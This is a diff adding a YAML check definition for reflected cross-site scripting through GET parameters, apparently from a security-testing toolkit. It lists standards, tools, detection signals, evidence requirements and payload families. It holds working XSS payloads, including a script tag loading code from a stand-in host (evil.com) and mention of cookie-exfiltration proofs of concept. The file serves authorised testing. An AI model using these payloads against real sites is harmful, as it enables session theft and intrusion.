@@ -1,0 +1,111 @@
+id: xss-reflected-get
+name: Reflected XSS via GET Parameter
+category: xss
+description: 'User-supplied input in GET query parameters is reflected in the HTTP
+  response
+
+  without proper HTML entity encoding or output sanitization. The attacker crafts
+
+  a URL containing malicious JavaScript that executes in the victim''s browser
+
+  when clicked. Most common entry-level XSS variant found in search boxes,
+
+  filters, redirects, and error messages.
+
+  '
+severity: medium
+standards:
+  wstg:
+  - WSTG-INPV-01
+  asvs:
+  - V3.4.3
+  - V3.2.2
+  - V3.2.1
+  vrt:
+  - cross_site_scripting_xss.reflected.non_self
+  cwe:
+  - CWE-79
+applies_to:
+  archetypes:
+  - all
+  surfaces:
+  - all-parameterized-endpoints
+  - search-endpoints
+  - redirect-endpoints
+  - error-pages
+requires:
+  auth: none
+  inputs:
+  - list of URL query parameters from crawler
+  - httpx-probed live URLs with params
+  - gau/waybackurls parameterized URL list
+  tools:
+  - curl
+  - dalfox
+  - httpx
+  - gau
+signals:
+  positive:
+  - Input string reflected verbatim in HTML response body without encoding
+  - Angle brackets preserved in reflection (<script> not escaped)
+  - Double quotes not escaped when reflected inside HTML attribute
+  - Input appears in JavaScript context without JSON encoding
+  - dalfox reports verified reflected XSS
+  negative:
+  - Input is HTML-entity-encoded in response (safe)
+  - Content-Type header is application/json (XSS only via content-type sniffing)
+  - CSP header present with 'unsafe-inline' not allowed AND no bypass found
+  - Web frameworks using auto-escaping templates (Angular JSX, React, Vue with mustache)
+  - 'X-XSS-Protection: 1; mode=block present (legacy but effective for basic reflection)'
+safety:
+  intrusive: false
+  data_modifying: false
+  rate_limited: false
+  requires_approval: false
+evidence:
+  required:
+  - curl command + full response showing raw reflection
+  - screenshot of reflected payload in rendered page
+  - PoC URL that triggers alert() / document.cookie / fetch() exfil
+  - har file or burp log of request/response pair
+references:
+  urls:
+  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
+  - https://portswigger.net/web-security/cross-site-scripting/reflected
+  papers:
+  - OWASP XSS Prevention Cheat Sheet
+  writeups:
+  - https://hackerone.com/reports/top-xss
+workflow_mapping:
+  skill: xss
+  workflow: W1 (reflected param test)
+payload_families:
+- name: basic_polyglot
+  description: Short payloads that execute in multiple contexts
+  examples:
+  - '"><img src=x onerror=alert(1)>'
+  - '"'';alert(1)//'
+  - jaVasCript:/*-/*`/*\`/*\'/*"/*</style></title></textarea>*/<svg/onload=alert(1)>
+- name: event_handler
+  description: HTML event handler injection
+  examples:
+  - '" onmouseover=alert(1)'
+  - '" onfocus=alert(1) autofocus'
+  - <body onload=alert(1)>
+- name: script_tag
+  description: Direct script element injection
+  examples:
+  - <script>alert(1)</script>
+  - <script src=//evil.com/xss.js></script>
+- name: anchor_href
+  description: JavaScript protocol in attributes
+  examples:
+  - javascript:alert(1)
+  - javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+tags:
+- reflected
+- get-parameter
+- unauthenticated
+- parameter-reflection
+- html-context
+- attribute-context
